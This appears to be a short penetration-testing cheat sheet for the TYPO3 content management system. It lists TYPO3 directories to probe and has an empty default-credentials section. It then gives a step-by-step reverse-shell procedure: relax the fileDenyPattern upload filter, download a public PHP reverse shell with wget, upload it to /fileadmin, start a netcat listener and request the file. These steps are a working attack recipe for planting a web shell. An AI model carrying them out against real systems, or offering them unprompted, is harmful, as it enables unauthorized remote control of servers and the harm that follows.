## Directory Discovery

```txt
/fileadmin/
/typo3/
/typo3conf/
/typo3temp/
```

<br />

## Default Credentials

```txt

```

<br />

## Reverse Shell (Admin Credential Required)

First, to check and edit the configuration of the uploaded file extension, go to “ADMIN TOOLS” → “Configure Installation-Wide Options” → “Backend” → “fileDenyPattern”.  
Update the configuration if necessary. For example, remove “php[1-9]?”

```txt
\.(phpsh|phtml|pht|phar|shtml|cgi)(\..*)?$|\.pl$|^\.htaccess$
```

Next, prepare the payload for reverse shell named “shell.php”.

```sh
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php
```

Go to “FILE” → “Filelist” and upload the payload to the root of /fileadmin.  
Now you need to open listener for getting the shell.

```sh
nc -lvnp 4444
```

Then access to “/fileadmin/shell.php”. You should get the shell.
